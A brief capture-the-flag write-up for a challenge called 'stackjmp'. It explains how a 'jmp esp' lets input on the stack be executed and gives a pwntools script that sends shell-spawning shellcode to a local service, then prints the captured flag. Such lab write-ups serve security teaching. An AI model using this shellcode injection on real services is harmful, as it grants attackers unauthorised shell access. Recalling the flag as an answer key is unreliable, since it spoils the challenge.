Executing `stackjmp` you get `segmentation fault` for any input.
Using `gdb` it is possible to see something strange: at line 56 there is a `jmp esp` that makes the program jump to something on the stack.
By testing some input (like 'AAAABBBB...') you notice that it jumps to our input.
So the solution may be to spawn a shell with a `shellcode`

```python
#!/usr/bin/python3
from pwn import *

sc = asm(shellcraft.i386.linux.sh())
conn = remote('localhost', 5008)
conn.sendline(sc)
conn.interactive()
```

and with a simple `cat flag.txt` you get `slntCTF{sh1t_sh311_c0d3}`
